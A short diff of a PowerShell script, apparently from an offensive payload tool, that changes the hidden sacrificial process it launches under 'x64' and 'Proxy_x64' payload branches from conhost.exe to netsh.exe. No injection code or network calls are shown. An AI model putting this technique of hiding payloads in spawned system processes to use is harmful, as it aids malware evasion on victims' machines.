@@ -234,7 +234,7 @@ if ($Payload -eq 'Proxy_x64')
         $pst.WindowStyle = 'Hidden'
         $pst.UseShellExecute = $False
         $pst.CreateNoWindow = $True
-        $pst.FileName = "C:\Windows\System32\conhost.exe"
+        $pst.FileName = "C:\Windows\System32\netsh.exe"
         $Process = [System.Diagnostics.Process]::Start($pst)
         [Int32]$ProcId = ($Process.Id).tostring()
     }
@@ -249,7 +249,7 @@ if ($Payload -eq 'x64')
         $pst.WindowStyle = 'Hidden'
         $pst.UseShellExecute = $False
         $pst.CreateNoWindow = $True
-        $pst.FileName = "C:\Windows\System32\conhost.exe"
+        $pst.FileName = "C:\Windows\System32\netsh.exe"
         $Process = [System.Diagnostics.Process]::Start($pst)
         [Int32]$ProcId = ($Process.Id).tostring()
     }
